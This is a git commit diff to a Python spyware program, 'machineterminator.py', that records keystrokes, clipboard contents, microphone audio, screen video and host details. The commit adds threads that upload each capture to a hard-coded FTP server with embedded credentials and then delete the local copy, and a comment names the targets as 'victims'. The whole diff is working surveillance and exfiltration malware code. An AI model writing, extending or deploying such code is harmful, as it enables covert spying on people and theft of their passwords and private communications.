e4818efaed3653b04dc1219a0f7df8ba87ef2ffc
Aly Muhammad Aly <deswigoaly@gmail.com>
2020-07-12 01:17:30 +0200

    Using the sending function with each process in ordere to send files via FTP after specified period of time.

--- machineterminator.py
+++ machineterminator.py
@@ -18,12 +18,15 @@ from scipy.io.wavfile import read, write
 from pynput.keyboard import Key, Listener
 from ftplib import FTP 
 
-WAV_FILENAME = "soundrec.wav"
-SCREEN_RECORDING_MP4_FILENAME = "screenrec.mp4"
+WAV_EXT = ".wav"
+MP4_EXT = ".mp4"
+TXT_EXT = ".text"
+WAV_FILENAME = "soundrec"
+SCRN_REC_MP4_FILENAME = "screenrec"
 MACHINE_INFO_FILE = "machineinfo.text"
-LOG_FILE = "keylogs.text"
-READABLE_LOG_FILE = "readablelogs.text"
-CLIPBOARD_HISTORY_FILE = "clipboardhistory.text"
+LOG_FILE = "keylogs"
+READABLE_LOG_FILE = "readablelogs"
+CLIPBOARD_HISTORY_FILE = "clipboardhistory"
 SERVER_ADDRESS = "192.168.1.65"
 SERVER_USERNMAE = "Aly Muhammad Aly"
 SERVER_PASSWORD = "alyaly"
@@ -39,24 +42,33 @@ SAMPLE_RATE = 44100
 SOUND_RECORD_SECONDS = 60
 SERVER_PORT = 2121
 
+count = 0
+number_of_keys_pressed = 1000
 
 def press_keys(key):
+	global count, number_of_keys_pressed
 	keys = []
 	keys.append(key)
 	current_date_time = datetime.datetime.now()
-	write_readable_file(keys, current_date_time)
-	write_log_file(keys, current_date_time)
-	keys  = []
+	write_readable_file(keys, current_date_time, number_of_keys_pressed)
+	write_log_file(keys, current_date_time, number_of_keys_pressed)
+	count += 1
+	if count == number_of_keys_pressed:
+		send_log_file = threading.Thread(target=send_file_via_ftp_server, args=(LOG_FILE + ("#" + str(number_of_keys_pressed).split('0')[0]) + TXT_EXT,))
+		send_log_file.start()
+		send_readable_file = threading.Thread(target=send_file_via_ftp_server, args=(READABLE_LOG_FILE + ("#" + str(number_of_keys_pressed).split('0')[0]) + TXT_EXT,))
+		send_readable_file.start()
+		number_of_keys_pressed += 1000
 
-def write_log_file(keys, current_date_time):
-	with open(LOG_FILE, "a") as file:
+def write_log_file(keys, date_time, number_of_keys_pressed):
+	with open(LOG_FILE + ("#" + str(number_of_keys_pressed).split('0')[0]) + TXT_EXT, "a") as file:
 		for key in keys:
 			file.write(str(key))
-			file.write(str(current_date_time))
+			file.write(str(date_time))
 			file.write("\n")
 
-def write_readable_file(keys, date_time):
-	with open(READABLE_LOG_FILE, "a") as file:
+def write_readable_file(keys, date_time, number_of_keys_pressed):
+	with open(READABLE_LOG_FILE + ("#" + str(number_of_keys_pressed).split('0')[0]) + TXT_EXT, "a") as file:
 		for key in keys:
 			k = str(key).replace("'","")
 			if k.find("space") > 0:
@@ -68,6 +80,8 @@ def write_readable_file(keys, date_time):
 
 def write_machine_info_file():
 	with open(MACHINE_INFO_FILE, "a") as file:
+		file.write(str(datetime.datetime.now()))
+		file.write("\n")
 		file.write("Host name: %s" %socket.gethostname())
 		file.write("\n")
 		file.write("IP address: %s" %socket.gethostbyname(socket.gethostname()))
@@ -81,21 +95,29 @@ def write_machine_info_file():
 		file.write("Machine version: %s" %platform.version())
 		file.write("\n")
 		file.write("public IP: %s" %get('https://api.ipify.org').text)
+	# Sending file via FTP and then deleted from the victims' machine	
+	send_file_via_ftp_server(MACHINE_INFO_FILE)
 
 def get_clipboard_history():
+	current_hour = datetime.datetime.now().hour
 	clipboard_history = ""
-	open(CLIPBOARD_HISTORY_FILE, "w")
 	while True:
 		if pyperclip.paste() == clipboard_history:
- 			print("nothing new")
- 		else:
- 			with open(CLIPBOARD_HISTORY_FILE, "a") as file:
- 				file.write(pyperclip.paste())
- 				file.write(str(pyperclip.paste()))
- 				file.write("\n")
- 			clipboard_history = pyperclip.paste()
+			open(CLIPBOARD_HISTORY_FILE + str(current_hour) + TXT_EXT, "a")
+		else:
+			with open(CLIPBOARD_HISTORY_FILE + str(current_hour) + TXT_EXT, "a") as file:
+				file.write(pyperclip.paste())
+				file.write(str(pyperclip.paste()))
+				file.write("\n")
+			clipboard_history = pyperclip.paste()
+		if datetime.datetime.now().hour != current_hour:
+			print("hey")
+			send_file = threading.Thread(target=send_file_via_ftp_server, args=(CLIPBOARD_HISTORY_FILE + str(current_hour) + TXT_EXT,))
+			send_file.start()
+			current_hour = datetime.datetime.now().hour
 
 def record_sound():
+	file_number = 1
 	while True:
 		my_pyaudio = pyaudio.PyAudio()
 		stream = my_pyaudio.open(format=SOUND_FORMAT,channels=CHANNELS,rate=SAMPLE_RATE,
@@ -111,17 +133,23 @@ def record_sound():
 		my_pyaudio.terminate()
 
 		# Generating an audio (wav) file.
-		wave_file = wave.open(WAV_FILENAME, "wb")
+		wave_file = wave.open(WAV_FILENAME + str(file_number) + WAV_EXT , "wb")
 		wave_file.setnchannels(CHANNELS)
 		wave_file.setsampwidth(my_pyaudio.get_sample_size(SOUND_FORMAT))
 		wave_file.setframerate(SAMPLE_RATE)
 		wave_file.writeframes(b"".join(frames))
 		wave_file.close()
 
+		# Sending the sound file via FTP.
+		send_file = threading.Thread(target=send_file_via_ftp_server, args=(WAV_FILENAME + str(file_number) + WAV_EXT,))
+		send_file.start()
+
+		file_number += 1
+
 def record_screen():
 	file_number = 1 
 	while True:
-		video_file = cv2.VideoWriter(SCREEN_RECORDING_MP4_FILENAME, MP4_FOURCC,
+		video_file = cv2.VideoWriter(SCRN_REC_MP4_FILENAME + str(file_number) + MP4_EXT, MP4_FOURCC,
 									 SCREEN_RECORDING_FPS,SCREEN_RECORDING_SIZE)
 		for i in range(int(SCREEN_RECORDING_FPS * SCREEN_RECORDING_SECONDS)):
 			screenshot = pyautogui.screenshot()
@@ -130,6 +158,12 @@ def record_screen():
 			video_file.write(frame)
 		cv2.destroyAllWindows()
 		video_file.release()
+
+		# Sending the sound file via FTP.
+		send_file = threading.Thread(target=send_file_via_ftp_server, args=(SCRN_REC_MP4_FILENAME + str(file_number) + MP4_EXT,))
+		send_file.start()
+
+		file_number += 1 
 
 def send_file_via_ftp_server(file_name):
 	# Creating an FTP instance and connecting to the server.
@@ -141,6 +175,7 @@ def send_file_via_ftp_server(file_name):
 	# Sending files using Storbinary method.
 	with open(file_name, 'rb') as file:
 		ftp.storbinary('STOR %s' % os.path.basename(file_name), file, SENDING_SPEED_IN_BYTES)
+	os.remove(file_name)
 
 def main():
 	machine_info = threading.Thread(target=write_machine_info_file)
